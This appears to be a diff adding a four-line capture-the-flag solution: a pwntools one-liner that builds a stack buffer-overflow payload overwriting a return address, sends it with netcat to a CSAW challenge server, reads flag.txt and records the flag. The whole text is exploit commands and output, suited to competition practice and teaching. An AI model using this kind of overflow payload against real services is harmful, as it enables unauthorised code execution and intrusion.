@@ -1,0 +1,4 @@
+python -c "from pwn import *; print 'A' * 0x28 + p64(0x4005B6)" > exploit
+cat exploit - | nc pwn.chal.csaw.io 9001
+cat flag.txt
+flag{y0u_deF_get_itls}
